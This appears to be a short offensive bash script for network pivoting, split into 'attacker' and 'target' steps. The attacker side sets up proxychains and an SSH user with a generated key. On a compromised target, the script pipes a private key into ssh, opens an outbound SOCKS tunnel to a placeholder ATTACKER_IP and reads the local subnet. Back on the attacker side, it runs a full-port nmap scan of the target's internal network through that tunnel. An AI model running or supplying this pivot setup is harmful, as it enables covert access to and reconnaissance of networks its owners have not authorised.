#!/bin/bash

# attacker
sudo apt-get update && apt-get install -y proxychains
sudo adduser socksuser
sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f ~/.ssh/socksuser_key"
sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> ~/.ssh/authorized_keys"
sudo -H -u socksuser /bin/bash -c "chmod 600 ~/.ssh/authorized_keys"

# target
KEY="${ YOUR SSH KEY HERE INSIDE }"
ATTACKER_IP=${ ATTACKER IP }
echo "${KEY}" | ssh -q -i /dev/stdin -f -N -D 9050 socksuser@${ATTACKER_IP}
IP_AND_MASK=$(ip -o -f inet addr show | awk '/scope global/ {print $4}')

# attacker
proxychains nmap -Pn -p- $IP_AND_MASK